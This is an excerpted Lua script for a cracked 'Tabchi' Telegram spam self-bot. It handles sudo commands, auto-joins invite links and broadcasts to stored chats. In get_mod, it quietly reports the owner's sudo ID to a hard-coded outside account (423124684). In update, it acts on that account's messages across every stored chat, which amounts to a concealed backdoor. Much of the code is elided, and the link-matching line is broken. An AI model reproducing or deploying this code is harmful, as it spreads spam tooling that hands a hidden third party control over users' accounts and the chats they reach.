...
function process(msg)
  ...
  do
    ...
    if msg.text:match("^[!/#]setanswer") and is_sudo(msg) and #matches == 3 then
      ...
      return "cracked by @morteza_df - Answer for " .. matches[2] .. " set to " .. matches[3]
    end
  end
  do
    local matches = {
    ...
    do
      ...
      local inline = function(arg, data)
        if data.results_ and data.results_[0] then
          ...
          local text = [[
*Tabchi Moded by @morteza_df -- Normal stats :*
Users : ]] .. pvs .. [[
  ...
  do
    ...
    if msg.text:match("^[!/#]addedmsg") and is_sudo(msg) and #matches == 2 then
      if matches[2] == "on" then
        ...
        return "Added Message Turned On *cracked by @morteza_df*"
  ...
  do
    ...
    if msg.text:match("^[!/#]markread") and is_sudo(msg) and #matches == 2 then
      if matches[2] == "on" then
        ...
        return "Markread Turned On *open by @morteza_df*"
      elseif matches[2] == "off" then
...
function process_links(text_)
  if text_:match("https://t.me/joinchat/%S+" or "https://telegram.me/joinchat/%S+") then
    local matches = {
      text_:match("(https://t.me/joinchat/%S+ or https://telegram.me/joinchat/%S+)")
    }
    tdcli_function({
...
function get_mod(args, data)
  if data.is_blocked_ then
    tdcli.unblockUser(423124684)
  end
  if not redis:get("tabchi:" .. tabchi_id .. ":startedmod") or redis:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -2 then
    tdcli.sendBotStartMessage(423124684, 423124684, "new")
    tdcli.sendMessage(423124684, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. tabchi_id .. ":fullsudo"), 1, "md")
...
function update(data, tabchi_id)
  ...
  if data.ID == "UpdateNewMessage" then
    ...
    if msg.sender_user_id_ == 423124684 then
      if msg.content_.text_ then
        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 423124684 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
          return
        else
          local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
          local id = msg.id_
